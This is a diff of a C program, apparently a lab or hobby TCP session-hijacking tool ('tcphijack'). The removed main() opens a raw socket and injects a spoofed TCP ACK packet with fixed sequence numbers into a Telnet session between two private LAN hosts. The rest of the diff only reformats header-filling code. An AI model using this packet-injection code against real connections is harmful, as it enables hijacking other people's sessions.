@@ -1,96 +1,5 @@
 #include "tcphijack.h"
 
-//Debug function: dump 'index' bytes beginning at 'buffer'
-void hexdump(unsigned char *buffer, unsigned long index) {
-  unsigned long i;
-  printf("hexdump on address %p:\n", buffer);
-  for (i=0;i<index;i++)
-  {
-    printf("%02x ",buffer[i]);
-  }
-  printf("\n");
-}
-
-//Calculate the TCP header checksum of a string (as specified in rfc793)
-//Function from http://www.binarytides.com/raw-sockets-c-code-on-linux/
-unsigned short csum(unsigned short *ptr,int nbytes);
-
-void send_packet(int socket_fd, char *packet, struct sockaddr_in addr_in);
-
-void gen_packet(  char *srcIP,
-                  char *dstIP,
-                  u_int16_t dstPort,
-                  u_int16_t srcPort,
-                  u_int32_t syn,
-                  u_int16_t ack,
-                  u_int32_t seq,
-                  u_int32_t ack_seq,
-                  char data,
-                  char *packet,
-                  uint32_t packet_size);
-
-
-int main(int argc, char **argv) {
-  int sock, one = 1;
-
-  //Setup
-  char *srcIP = "192.168.1.112";
-  char *dstIP = "192.168.1.113";
-  int dstPort = 23;
-  int srcPort = 59590;
-  int packet_size = 44;
-
-  //Ethernet header + IP header + TCP header + data
-  char packet[packet_size];
-
-  //Address struct to sendto()
-  struct sockaddr_in addr_in;
-  
-  //Raw socket without any protocol-header inside
-  if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
-    perror("Error while creating socket");
-    exit(-1);
-  }
-
-  //Set option IP_HDRINCL (headers are included in packet)
-  if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one)) < 0) {
-    perror("Error while setting socket options");
-    exit(-1);
-  }
-
-  //Populate address struct
-  addr_in.sin_family = AF_INET;
-  addr_in.sin_port = htons(dstPort);
-  addr_in.sin_addr.s_addr = inet_addr(dstIP);
-
-  //Allocate mem for ip and tcp headers and zero the allocation
-  
- 
-  //Send lots of packets
-  int k = 5;
-  while(k--) { 
-    
-    gen_packet( srcIP,
-                dstIP,
-                dstPort,
-                srcPort,
-                0, //syn
-                1, //ack
-                4012204404, //seq
-                2948134111, //syn_ack
-                'z', //data
-                packet,
-                packet_size);
-
-    send_packet(sock, packet, addr_in);
-    
-
-    break;
-  }
-  
-  return 0;
-}
-
 void send_packet(int socket_fd, char *packet, struct sockaddr_in addr_in) {
   int bytes;
   struct iphdr *ipHdr = (struct iphdr *) packet;
@@ -146,8 +55,8 @@ void gen_packet(  char *srcIP,
 
   //Populate tcpHdr
   tcpHdr->source = htons(srcPort); //16 bit in nbp format of source port
-  tcpHdr->dest = htons(dstPort); //16 bit in nbp format of destination port
-  tcpHdr->seq = htonl(seq);//seq; //32 bit sequence number, initially set to zero
+  tcpHdr->dest = htons(dstPort);   //16 bit in nbp format of destination port
+  tcpHdr->seq = htonl(seq); //seq; //32 bit sequence number, initially set to zero
   tcpHdr->ack_seq = htonl(ack_seq);//ack_seq; //32 bit ack sequence number, depends whether ACK is set or not
   tcpHdr->doff = 5; //4 bits: 5 x 32-bit words on tcp header
   tcpHdr->res1 = 0; //4 bits: Not used
